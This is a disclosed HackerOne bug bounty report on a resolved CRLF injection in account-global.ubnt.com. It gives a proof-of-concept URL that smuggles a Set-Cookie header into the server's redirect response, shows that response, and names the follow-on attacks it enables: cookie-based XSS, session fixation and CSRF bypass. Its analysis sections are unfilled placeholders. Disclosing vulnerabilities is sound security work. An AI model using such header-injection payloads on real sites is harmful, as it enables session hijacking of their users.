---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '145128'
original_report_id: '145128'
title: '[account-global.ubnt.com] CRLF Injection'
team_handle: ui
created_at: '2016-06-16T09:52:03.180Z'
disclosed_at: '2017-03-31T19:36:18.579Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 17
tags:
- hackerone
---

# [account-global.ubnt.com] CRLF Injection

## Metadata

- HackerOne Report ID: 145128
- Weakness: 
- Program: ui
- Disclosed At: 2017-03-31T19:36:18.579Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**PoC** (any browser except FireFox):
`http://account-global.ubnt.com/%3f%0dSet-Cookie:crlf=injection%3bdomain=.ubnt.com%3b`

**HTTP Response**:
```
HTTP/1.1 302 Found
Content-Type: text/html; charset=iso-8859-1
Date: Thu, 16 Jun 2016 09:59:15 GMT
Location: https://account-global.ubnt.com/index.html?         <= injection \r
Set-Cookie:crlf=injection;domain=.ubnt.com;
```

This vulnerability could be used in combination with others. For example, XSS via Cookie, session fixation or bypass Double-Submit Cookie CSRF protection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
